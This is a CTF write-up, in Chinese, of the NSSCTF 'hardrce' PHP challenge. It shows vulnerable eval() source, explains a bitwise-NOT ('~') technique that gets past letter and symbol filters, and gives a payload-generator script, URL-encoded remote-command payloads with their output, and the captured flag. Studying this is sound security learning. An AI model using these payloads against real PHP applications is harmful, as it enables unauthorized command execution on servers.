---
title: "[SWPUCTF 2021 新生赛] hardrce"
date: 2026-05-18
category: WEB
tags:
  - PHP
  - RCE
  - 无字母绕过
  - 取反绕过
NSSCTF: https://www.nssctf.cn/problem/439
---

# [SWPUCTF 2021 新生赛] hardrce

## 题目信息

- **URL**: `http://node7.anna.nssctf.cn:23112/`
- **类型**: PHP 无字母 RCE
- **核心考点**: `~` 取反绕过 + PHP 裸字节常量特性

## 源码

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?>
```

## 过滤分析

| 过滤类型 | 内容 |
|---------|------|
| 符号黑名单 | 空格、制表符、换行、`+`、`[`、`]`、`"`、`-`、`$`、`*`、`?`、`<`、`>`、`=`、`` ` `` |
| 字母黑名单 | `/[a-zA-Z]/is` —— **所有字母** |

**未过滤的关键字符**: `~`（按位取反）、`(` `)`（括号）、`|`（管道）、`.`（连接符）、`;`（语句结束）

## 思路分析

### 核心原理：PHP 取反 + 裸字节常量

PHP 中 `~` 对字符串的每个字节按位取反。利用这一特性：
1. 将要执行的命令（如 `system`）每个字符按位取反，得到一串 `-ÿ` 范围内的"乱码"字节
2. 将这些字节通过 URL 编码传入，绕过字母和符号过滤
3. `eval()` 执行时，`~` 再次取反，还原为原始命令

### 关键发现：无引号裸字节常量语法

PHP 7.x 中，`-ÿ` 范围内的裸字节序列会被解析器当作**未定义常量名**。常量未定义时，其值默认为**该常量名字符串本身**。因此：

```php
(~\x8c\x86\x8c\x8b\x9a\x92)
// 等价于
(~"\x8c\x86\x8c\x8b\x9a\x92")
// 取反后得到
("system")
```

再通过 `(system)(command)` 的动态函数调用语法执行命令。

**注意**：本题中 **单引号包裹的字符串语法 `(~'...')()` 在远程 PHP 7.4 下不工作**，必须使用**无引号裸字节常量语法** `(~\x8c\x86...)`。

## 踩坑记录（耗时原因）

### 坑 1：Python `requests` 二次编码陷阱

起初使用 `requests.get(url, params={"wllm": "(~'%8F%97...')()"})`，`requests` 会自动对 `params` 进行 URL 编码，将 `%` 二次编码为 `%25`。导致 PHP 解码后 `$wllm` 中残留 `%8F` 文本（含字母 `F`），触发字母过滤器。

**解决**：改用 `curl` 直接发送，或手动拼接完整 URL，避免二次编码。

### 坑 2：死磕单引号语法 `(~'...')()`

本地 PHP 8.4 测试 `echo (~"\x8f\x97...")()` 成功，但远程 PHP 7.4 始终无回显。反复排查函数是否被 `disable_functions`、输出是否被截断等问题，浪费大量时间。

**根因**：单引号字符串中的字节处理与无引号常量语法在 PHP 7.4 中有差异。**无引号裸字节常量语法**才是本题正确路径。

### 坑 3：没有第一时间用本地 PHP 验证语法差异

虽然环境有 PHP 8.4，但没有立即写 `.php` 文件测试 `(~'\x8f')()` 与 `(~\x8f)` 的行为差异。如果第一时间本地验证，能少走大量弯路。

### 坑 4：flag 文件名数错字母

`ls /` 发现 `flllllaaaaaaggggggg`，但肉眼看错 `a` 的数量（实际为 **6 个 a**），导致 `cat` 命令失败，又多绕了一圈 `file` 和 `ls` 子目录排查。

## EXP

### Step 1：构造取反 Payload

用 PHP 脚本生成取反后的 URL 编码：

```php
<?php
echo urlencode(~'system') . "\n";
echo urlencode(~'ls /') . "\n";
echo urlencode(~'cat /flllllaaaaaaggggggg') . "\n";
?>
```

输出：
```
%8C%86%8C%8B%9A%92
%93%8C%DF%D0
%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98
```

### Step 2：执行命令

**查看根目录：**
```
?wllm=(~%8c%86%8c%8b%9a%92)(~%93%8c%df%d0);
```

回显：
```
bin
boot
dev
etc
flllllaaaaaaggggggg
home
lib
...
```

**读取 flag：**
```
?wllm=(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);
```

## Flag

```
NSSCTF{c550eed0-2c33-4cac-88aa-905b4f793aed}
```

## 总结

- **取反绕过**是无字母 RCE 中最直接的手段之一，关键在于 `~` 运算符未被过滤
- **PHP 裸字节常量语法** `(~\x8c...)` 比单引号字符串更隐蔽，适合 `-ÿ` 范围内的字节序列
- 空格、斜杠等特殊字符可以通过取反（`~0x20=0xdf`、`~0x2f=0xd0`）构造，运行时还原
- 工具选择很重要：`curl` 比 `requests` 更适合需要精确控制 URL 编码的场景
